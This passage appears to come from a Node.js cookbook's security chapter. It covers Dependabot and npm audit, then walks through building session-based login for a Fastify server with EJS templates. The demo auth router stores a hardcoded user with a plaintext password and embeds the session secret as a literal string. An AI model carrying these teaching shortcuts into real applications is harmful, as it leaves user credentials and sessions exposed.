       process, respectively.
      </span>
     </span>
    </li>
   </ul>
   <h2 id="_idParaDest-274">
    <a id="_idTextAnchor281">
    </a>
    <span class="koboSpan" id="kobo.255.1">
     There’s more...
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.256.1">
     In addition to using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.257.1">
      npm audit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.258.1">
     , you can leverage GitHub’s Dependabot to enhance your project’s security and keep your dependencies up to date.
    </span>
    <span class="koboSpan" id="kobo.258.2">
     Dependabot automates the process of checking for vulnerabilities and creating pull requests to update your dependencies.
    </span>
    <span class="koboSpan" id="kobo.258.3">
     It continuously monitors your project’s dependencies and alerts you if it detects any vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.258.4">
     Dependabot can automatically open pull requests to update outdated dependencies to their
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.259.1">
      latest versions.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.260.1">
     By integrating Dependabot with your GitHub repository, you can ensure that your project stays current with the latest security patches and updates, reducing the risk of potential
    </span>
    <a id="_idIndexMarker687">
    </a>
    <span class="koboSpan" id="kobo.261.1">
     vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.261.2">
     Please refer to
    </span>
    <a href="https://docs.github.com/en/code-security/dependabot">
     <span class="koboSpan" id="kobo.262.1">
      https://docs.github.com/en/code-security/dependabot
     </span>
    </a>
    <span class="koboSpan" id="kobo.263.1">
     for GitHub guidelines on enabling and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.264.1">
      using Dependabot.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-275">
    <a id="_idTextAnchor282">
    </a>
    <span class="koboSpan" id="kobo.265.1">
     See also
    </span>
   </h2>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.266.1">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.267.1">
       npm
      </span>
     </strong>
     <span class="koboSpan" id="kobo.268.1">
      documentation
     </span>
     <a id="_idIndexMarker688">
     </a>
     <span class="koboSpan" id="kobo.269.1">
      for
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.270.1">
       npm
      </span>
     </strong>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.271.1">
        audit
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.272.1">
       :
      </span>
     </span>
     <a href="https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities">
      <span class="No-Break">
       <span class="koboSpan" id="kobo.273.1">
        https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities
       </span>
      </span>
     </a>
    </li>
    <li>
     <span class="koboSpan" id="kobo.274.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.275.1">
       Consuming Node.js modules
      </span>
     </em>
     <span class="koboSpan" id="kobo.276.1">
      recipe in
     </span>
     <a href="B19212_05.xhtml#_idTextAnchor139">
      <span class="No-Break">
       <em class="italic">
        <span class="koboSpan" id="kobo.277.1">
         Chapter 5
        </span>
       </em>
      </span>
     </a>
    </li>
   </ul>
   <h1 id="_idParaDest-276">
    <a id="_idTextAnchor283">
    </a>
    <span class="koboSpan" id="kobo.278.1">
     Authentication with Fastify
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.279.1">
     Many web
    </span>
    <a id="_idIndexMarker689">
    </a>
    <span class="koboSpan" id="kobo.280.1">
     applications require a login system.
    </span>
    <span class="koboSpan" id="kobo.280.2">
     Often, users of a website have different privileges, and to determine which resources they can access, they must first be identified
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.281.1">
      through authentication.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.282.1">
     This is typically achieved by setting up a session, which is a temporary information exchange between a user and a device.
    </span>
    <span class="koboSpan" id="kobo.282.2">
     Sessions enable the server to store user-specific information, which can be used to manage access and maintain the user’s state across
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.283.1">
      multiple requests.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.284.1">
     In this recipe, we’ll implement an authentication layer for a Fastify server.
    </span>
    <span class="koboSpan" id="kobo.284.2">
     Please refer to
    </span>
    <a href="B19212_06.xhtml#_idTextAnchor178">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.285.1">
        Chapter 6
       </span>
      </em>
     </span>
    </a>
    <span class="koboSpan" id="kobo.286.1">
     for more information
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.287.1">
      on Fastify.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-277">
    <a id="_idTextAnchor284">
    </a>
    <span class="koboSpan" id="kobo.288.1">
     Getting ready
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.289.1">
     Let’s start by creating a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.290.1">
      Fastify server:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.291.1">
      Create a project directory named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.292.1">
       fastify-auth
      </span>
     </strong>
     <span class="koboSpan" id="kobo.293.1">
      to work in and initialize the project with
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.294.1">
       npm
      </span>
     </strong>
     <span class="koboSpan" id="kobo.295.1">
      .
     </span>
     <span class="koboSpan" id="kobo.295.2">
      We’ll also create some files and subdirectories that we’ll use later in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.296.1">
       this recipe:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.297.1">$ mkdir fastify-auth</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.298.1">$ cd fastify-auth</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.299.1">$ npm init --yes</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.300.1">$ mkdir routes views</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.301.1">$ touch server.js routes/index.js views/index.ejs</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.302.1">
      We’ll also need to install
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.303.1">
       several modules:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.304.1">$ npm install fastify @fastify/view @fastify/formbody ejs</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.305.1">
      Add the following
     </span>
     <a id="_idIndexMarker690">
     </a>
     <span class="koboSpan" id="kobo.306.1">
      code to the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.307.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.308.1">
      file.
     </span>
     <span class="koboSpan" id="kobo.308.2">
      This will configure an initial Fastify server that
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.309.1">
       we’ll extend:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.310.1">
const fastify = require('fastify')({ logger: true });
const path = require('path');
const view = require('@fastify/view');
const fastifyFormbody = require('@fastify/formbody');
const indexRoutes = require('./routes/index');
fastify.register(fastifyFormbody);
fastify.register(view, {
  engine: {
    ejs: require('ejs')
  },
  root: path.join(__dirname, 'views')
});
fastify.register(indexRoutes);
const start = async () =&gt; {
  try {
    await fastify.listen({ port: 3000 });
    fastify.log.info(`Server listening on
      ${fastify.server.address().port}`);
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};
start();</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.311.1">
      Add the
     </span>
     <a id="_idIndexMarker691">
     </a>
     <span class="koboSpan" id="kobo.312.1">
      following to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.313.1">
       routes/index.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.314.1">
      to create a base router that will handle an HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.315.1">
       GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.316.1">
      request
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.317.1">
       on
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.318.1">
        /
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.319.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.320.1">
async function routes(fastify, options) {
    fastify.get('/', async (request, reply) =&gt; {
      return reply.view('index.ejs');
    });
  }
module.exports = routes;</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.321.1">
      Add the following to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.322.1">
       views/index.ejs
      </span>
     </strong>
     <span class="koboSpan" id="kobo.323.1">
      to create an
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.324.1">
       Embedded JavaScript
      </span>
     </strong>
     <span class="koboSpan" id="kobo.325.1">
      (
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.326.1">
       EJS
      </span>
     </strong>
     <span class="koboSpan" id="kobo.327.1">
      ) template.
     </span>
     <span class="koboSpan" id="kobo.327.2">
      For
     </span>
     <a id="_idIndexMarker692">
     </a>
     <span class="koboSpan" id="kobo.328.1">
      now, this will just be a simple welcome
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.329.1">
       page template:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.330.1">
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Authentication with Fastify&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Authentication with Fastify&lt;/h1&gt;
        &lt;% if (typeof user !== 'undefined' &amp;&amp; user) {
          %&gt;
        &lt;p&gt;Hello &lt;%= user.username %&gt;!&lt;/p&gt;
        &lt;p&gt;&lt;a href="/auth/logout"&gt;Logout&lt;/a&gt;&lt;/p&gt;
        &lt;% } else { %&gt;
        &lt;p&gt;&lt;a href="/auth/login"&gt;Login&lt;/a&gt;&lt;/p&gt;
        &lt;% } %&gt;
    &lt;/body&gt;
&lt;/html&gt;</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.331.1">
      Start the server
     </span>
     <a id="_idIndexMarker693">
     </a>
     <span class="koboSpan" id="kobo.332.1">
      with the following command and navigate to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.333.1">
       http://localhost:3000
      </span>
     </strong>
     <span class="koboSpan" id="kobo.334.1">
      in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.335.1">
       your browser:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.336.1">$ node server.js</span></strong></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.337.1">
     You should expect to see a web page titled
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.338.1">
      Authenticating with Fastify
     </span>
    </strong>
    <span class="koboSpan" id="kobo.339.1">
     .
    </span>
    <span class="koboSpan" id="kobo.339.2">
     Stop the server using
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.340.1">
      Ctrl
     </span>
    </em>
    <span class="koboSpan" id="kobo.341.1">
     +
    </span>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.342.1">
       C
      </span>
     </em>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.343.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.344.1">
     Now that we have a simple Fastify server, we can start implementing the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.345.1">
      authentication layer.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-278">
    <a id="_idTextAnchor285">
    </a>
    <span class="koboSpan" id="kobo.346.1">
     How to do it…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.347.1">
     In this recipe, we’ll add a login system to our Fastify server using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.348.1">
      @fastify/cookie
     </span>
    </strong>
    <span class="koboSpan" id="kobo.349.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.350.1">
      @
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.351.1">
       fastify/session
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.352.1">
      modules:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.353.1">
      Start by installing
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.354.1">
       the modules:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.355.1">$ npm install @fastify/cookie @fastify/session</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.356.1">
      We’ll create a separate router to handle authentication, as well as an EJS template that will contain our HTML login form.
     </span>
     <span class="koboSpan" id="kobo.356.2">
      Let’s create those
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.357.1">
       files now:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.358.1">$ touch routes/auth.js views/login.ejs</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.359.1">
      Now, let’s create our HTML login form using an EJS template.
     </span>
     <span class="koboSpan" id="kobo.359.2">
      The HTML form will have two fields:
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.360.1">
       username
      </span>
     </strong>
     <span class="koboSpan" id="kobo.361.1">
      and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.362.1">
       password
      </span>
     </strong>
     <span class="koboSpan" id="kobo.363.1">
      .
     </span>
     <span class="koboSpan" id="kobo.363.2">
      This template will expect to be passed a value
     </span>
     <a id="_idIndexMarker694">
     </a>
     <span class="koboSpan" id="kobo.364.1">
      named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.365.1">
       fail
      </span>
     </strong>
     <span class="koboSpan" id="kobo.366.1">
      .
     </span>
     <span class="koboSpan" id="kobo.366.2">
      When the fail value is
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.367.1">
       true
      </span>
     </strong>
     <span class="koboSpan" id="kobo.368.1">
      , the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.369.1">
       Login Failed.
      </span>
     </strong>
     <span class="koboSpan" id="kobo.370.1">
      message will be rendered.
     </span>
     <span class="koboSpan" id="kobo.370.2">
      Add the following code
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.371.1">
       to
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.372.1">
        views/login.ejs
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.373.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.374.1">
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Authentication with Fastify - Login&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Authentication with Fastify - Login&lt;/h1&gt;
    &lt;% if (fail) { %&gt;
    &lt;h2&gt;Login Failed.&lt;/h2&gt;
    &lt;% } %&gt;
    &lt;form method="post" action="login"&gt;
      Username: &lt;input type="text" name="username" /&gt;
      Password: &lt;input type="password" name="password"
        /&gt;
      &lt;input type="submit" value="Login" /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.375.1">
      Now, we need to build our authentication router.
     </span>
     <span class="koboSpan" id="kobo.375.2">
      We’ll do this in the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.376.1">
       routes/auth.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.377.1">
      file.
     </span>
     <span class="koboSpan" id="kobo.377.2">
      The authentication router will contain route handlers for the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.378.1">
       /login
      </span>
     </strong>
     <span class="koboSpan" id="kobo.379.1">
      and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.380.1">
       /logout
      </span>
     </strong>
     <span class="koboSpan" id="kobo.381.1">
      endpoints.
     </span>
     <span class="koboSpan" id="kobo.381.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.382.1">
       /login
      </span>
     </strong>
     <span class="koboSpan" id="kobo.383.1">
      endpoint will require both an HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.384.1">
       GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.385.1">
      and an HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.386.1">
       POST
      </span>
     </strong>
     <span class="koboSpan" id="kobo.387.1">
      handler.
     </span>
     <span class="koboSpan" id="kobo.387.2">
      The HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.388.1">
       POST
      </span>
     </strong>
     <span class="koboSpan" id="kobo.389.1">
      handler for the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.390.1">
       /login
      </span>
     </strong>
     <span class="koboSpan" id="kobo.391.1">
      endpoint will receive and parse the form data (username and password) to validate the user credentials.
     </span>
     <span class="koboSpan" id="kobo.391.2">
      Add the following to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.392.1">
       routes/auth.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.393.1">
      to
     </span>
     <a id="_idIndexMarker695">
     </a>
     <span class="koboSpan" id="kobo.394.1">
      create the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.395.1">
       authentication router:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.396.1">
const users = [{ username: 'beth', password:
  'badpassword' }];
async function routes (fastify, options) {
  fastify.get('/login', async (request, reply) =&gt; {
    return reply.view('login.ejs', { fail: false });
  });
  fastify.post('/login', async (request, reply) =&gt; {
    const { username, password } = request.body;
    const user = users.find((u) =&gt; u.username ===
      username);
    if (user &amp;&amp; password === user.password) {
      request.session.user = { username: user.username };
      await request.session.save();
      return reply.view('index.ejs', { user:
        request.session.user });
    } else { return reply.view('login.ejs', { fail:
      true }); }
  });
  fastify.get('/logout', async (request, reply) =&gt; {
    request.session.destroy((err) =&gt; {
      if (err) { return reply.send(err); }
      else { return reply.redirect('/'); }
    });
  });
}
module.exports = routes;</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.397.1">
      Next, we need to
     </span>
     <a id="_idIndexMarker696">
     </a>
     <span class="koboSpan" id="kobo.398.1">
      update our
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.399.1">
       routes/index.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.400.1">
      file so that we can pass the user data from the session to the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.401.1">
       EJS template:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.402.1">
async function routes (fastify, options) {
  fastify.get('/', async (request, reply) =&gt; {
</span><strong class="bold"><span class="koboSpan" id="kobo.403.1">    const user = request.session.user;</span></strong><span class="koboSpan" id="kobo.404.1">
    return reply.view('index.ejs'</span><strong class="bold"><span class="koboSpan" id="kobo.405.1">, { user: user }</span></strong><span class="koboSpan" id="kobo.406.1">);
  });
}
module.exports = routes;</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.407.1">
      Now, add the imports for
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.408.1">
       @fastify/cookie
      </span>
     </strong>
     <span class="koboSpan" id="kobo.409.1">
      and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.410.1">
       @fastify/session
      </span>
     </strong>
     <span class="koboSpan" id="kobo.411.1">
      alongside the other imports in the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.412.1">
        server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.413.1">
       file:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.414.1">
...
</span><span class="koboSpan" id="kobo.414.2">const view = require('@fastify/view');
const fastifyFormbody = require('@fastify/formbody');
</span><strong class="bold"><span class="koboSpan" id="kobo.415.1">const fastifyCookie = require('@fastify/cookie');</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.416.1">const fastifySession = require('@fastify/session');</span></strong><span class="koboSpan" id="kobo.417.1">
...</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.418.1">
      Import
     </span>
     <a id="_idIndexMarker697">
     </a>
     <span class="koboSpan" id="kobo.419.1">
      the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.420.1">
        auth
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.421.1">
       router:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.422.1">
const indexRoutes = require('./routes/index');
</span><strong class="bold"><span class="koboSpan" id="kobo.423.1">const authRoutes = require('./routes/auth');</span></strong><span class="koboSpan" id="kobo.424.1">
...</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.425.1">
      Register the plugins with the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.426.1">
       following configuration:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.427.1">
fastify.register(fastifyCookie);
fastify.register(fastifySession, {
  secret: 'a secret with minimum length of 32
    characters',
  cookie: {
    httpOnly: true
  },
  saveUninitialized: false,
  resave: false
});</span></pre>
    </li>
    <li>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.428.1">
       Register
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.429.1">
        authRoutes
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.430.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.431.1">
fastify.register(indexRoutes);
</span><strong class="bold"><span class="koboSpan" id="kobo.432.1">fastify.register(authRoutes, { prefix: '/auth' });</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.433.1">
      Start the server with the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.434.1">
       following command:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.435.1">$ node server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.436.1">
      Navigate to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.437.1">
       http://localhost:3000
      </span>
     </strong>
     <span class="koboSpan" id="kobo.438.1">
      in your browser.
     </span>
     <span class="koboSpan" id="kobo.438.2">
      Expect to see the following
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.439.1">
       web page:
      </span>
     </span>
    </li>
   </ol>
   <div>
    <div class="IMG---Figure" id="_idContainer042">
     <span class="koboSpan" id="kobo.440.1">
      <img alt="Figure 9.4 – Web page depicting “Authentication with Fastify”" src="image/B19212_09_04.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.441.1">
     Figure 9.4 – Web page depicting “Authentication with Fastify”
    </span>
   </p>
   <ol>
    <li value="12">
     <span class="koboSpan" id="kobo.442.1">
      Click
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.443.1">
       Login
      </span>
     </strong>
     <span class="koboSpan" id="kobo.444.1">
      ; you’ll
     </span>
     <a id="_idIndexMarker698">
     </a>
     <span class="koboSpan" id="kobo.445.1">
      be directed to the HTML login form.
     </span>
     <span class="koboSpan" id="kobo.445.2">
      Supply a random username and password and click
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.446.1">
       Login
      </span>
     </strong>
     <span class="koboSpan" id="kobo.447.1">
      .
     </span>
     <span class="koboSpan" id="kobo.447.2">
      Since this doesn’t match our hardcoded values, we expect to see the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.448.1">
       Login
      </span>
     </strong>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.449.1">
        Failed.
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.450.1">
       message.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.451.1">
      Let’s try the hardcoded values.
     </span>
     <span class="koboSpan" id="kobo.451.2">
      Supply a username of
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.452.1">
       beth
      </span>
     </strong>
     <span class="koboSpan" id="kobo.453.1">
      and a password of
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.454.1">
       badpassword
      </span>
     </strong>
     <span class="koboSpan" id="kobo.455.1">
      and click
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.456.1">
       Login
      </span>
     </strong>
     <span class="koboSpan" id="kobo.457.1">
      .
     </span>
     <span class="koboSpan" id="kobo.457.2">
      The login process should be successful.
     </span>
     <span class="koboSpan" id="kobo.457.3">
      You will redirect back to the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.458.1">
       /
      </span>
     </strong>
     <span class="koboSpan" id="kobo.459.1">
      endpoint, where there will be a
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.460.1">
       Hello
      </span>
     </strong>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.461.1">
        beth!
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.462.1">
       message.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.463.1">
      Finally, let’s try and log out.
     </span>
     <span class="koboSpan" id="kobo.463.2">
      Click the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.464.1">
       Logout
      </span>
     </strong>
     <span class="koboSpan" id="kobo.465.1">
      link.
     </span>
     <span class="koboSpan" id="kobo.465.2">
      This should redirect you back to the same endpoint, but the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.466.1">
       Hello beth!
      </span>
     </strong>
     <span class="koboSpan" id="kobo.467.1">
      message will be removed as the session
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.468.1">
       has ended.
      </span>
     </span>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.469.1">
     This recipe introduced the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.470.1">
      @fastify/cookie
     </span>
    </strong>
    <span class="koboSpan" id="kobo.471.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.472.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.473.1">
     modules and how we can use them to build a simple login functionality.
    </span>
    <span class="koboSpan" id="kobo.473.2">
     Now, let’s see how it
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.474.1">
      all works.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-279">
    <a id="_idTextAnchor286">
    </a>
    <span class="koboSpan" id="kobo.475.1">
     How it works…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.476.1">
     In this recipe, we built a
    </span>
    <a id="_idIndexMarker699">
    </a>
    <span class="koboSpan" id="kobo.477.1">
     login system using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.478.1">
      @fastify/cookie
     </span>
    </strong>
    <span class="koboSpan" id="kobo.479.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.480.1">
      @
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.481.1">
       fastify/session
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.482.1">
      modules.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.483.1">
     First, we imported and registered the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.484.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.485.1">
     plugin in the Fastify application (in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.486.1">
      server.js
     </span>
    </strong>
    <span class="koboSpan" id="kobo.487.1">
     file).
    </span>
    <span class="koboSpan" id="kobo.487.2">
     This plugin injects a session object into every request object.
    </span>
    <span class="koboSpan" id="kobo.487.3">
     Before the user is authenticated, the session value will be an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.488.1">
      empty object.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.489.1">
     When registering the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.490.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.491.1">
     plugin, we provided the following
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.492.1">
      configuration options:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.493.1">
       Secret
      </span>
     </strong>
     <span class="koboSpan" id="kobo.494.1">
      : Used to sign the session ID cookie, ensuring its integrity and preventing tampering.
     </span>
     <span class="koboSpan" id="kobo.494.2">
      It must be at least 32 characters long
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.495.1">
       for security.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.496.1">
       Cookie.httpOnly
      </span>
     </strong>
     <span class="koboSpan" id="kobo.497.1">
      : Configures the session cookie.
     </span>
     <span class="koboSpan" id="kobo.497.2">
      Note that
     </span>
     <strong class="source-inline">
